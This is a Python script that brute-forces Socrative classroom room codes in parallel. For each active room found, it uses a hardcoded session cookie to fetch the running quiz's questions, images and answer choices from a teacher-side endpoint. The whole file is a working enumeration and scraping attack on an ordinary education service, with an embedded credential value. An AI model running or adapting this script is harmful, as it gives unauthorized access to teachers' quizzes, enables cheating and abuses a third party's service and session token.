import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# Prompt the user for the base room name and the number of digits for the room code
base_room_name = input("Enter the base room name: ").strip()
num_digits = int(input("Enter the number of digits for the room code (e.g., 4 for codes like 0000-9999): "))

# A list to store information about all found rooms and their questions
found_rooms = []

# Define a function to check each room code
def check_room(room_name):
    url = f"https://api.socrative.com/rooms/api/current-activity/{room_name}"

    try:
        response = requests.get(url)
        if response.ok:
            data = response.json()
            if data:
                activity_id = data.get('activity_id')
                if activity_id:
                    url_activity = f"https://teacher.socrative.com/quizzes/{activity_id}/student?room={room_name}"
                    cookies = {
                        'sa': 'SA_0AFd_7NneDk0WafSUS0u0fIkHIJFmz3X'
                    }
                    activity_response = requests.get(url_activity, cookies=cookies)
                    if activity_response.ok:
                        activity_data = activity_response.json()
                        
                        # Collect room data
                        room_info = {
                            "room_name": room_name,
                            "activity_id": activity_id,
                            "activity_name": activity_data.get('name', 'N/A'),
                            "questions": []
                        }
                        
                        # Collect question and answer information
                        for question in activity_data.get('questions', []):
                            question_image = question.get('question_image')
                            question_info = {
                                "text": question.get('question_text', 'Question not available'),
                                "image_url": question_image.get('url') if question_image else None,  # Check if question_image exists
                                "type": question.get('type'),
                                "answers": []
                            }
                            
                            # Collect answer choices if applicable
                            if question['type'] in ["MC", "TF"]:
                                question_info["answers"] = [
                                    {"text": answer.get('text', 'Option not available'), "id": answer.get('id')}
                                    for answer in question.get('answers', [])
                                ]
                            elif question['type'] == "FR":
                                question_info["answers"] = ["Free response"]

                            room_info["questions"].append(question_info)
                        
                        found_rooms.append(room_info)
                        return True
        else:
            print(f"Room {room_name} does not exist or is inactive.")
    except requests.RequestException as e:
        print(f"Connection error for room {room_name}: {e}")
    except json.JSONDecodeError:
        print(f"Error processing data for room {room_name}.")
    return False

# Run the room checks in parallel
def main():
    with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust max_workers as needed
        futures = []
        for code in range(10 ** num_digits):
            room_name = f"{base_room_name}{code:0{num_digits}d}"
            futures.append(executor.submit(check_room, room_name))

        # Wait for all futures to complete
        for future in as_completed(futures):
            future.result()  # We don't need the return value here; it's handled in `found_rooms`

    # Display collected information after all rooms are checked
    if found_rooms:
        print("\nRooms with active activities found:")
        for room in found_rooms:
            print(f"\nRoom name: {room['room_name']}")
            print(f"Activity ID: {room['activity_id']}")
            print(f"Activity Name: {room['activity_name']}")
            print("Questions:")
            for idx, question in enumerate(room['questions'], start=1):
                print(f"  Question {idx}: {question['text']}")
                if question['image_url']:
                    print(f"    Image URL: {question['image_url']}")
                if question["type"] in ["MC", "TF"]:
                    print("    Answers:")
                    for answer in question["answers"]:
                        print(f"      - {answer['text']} (ID: {answer['id']})")
                elif question["type"] == "FR":
                    print("    - Free response")
    else:
        print("No active rooms were found.")

if __name__ == "__main__":
    main()
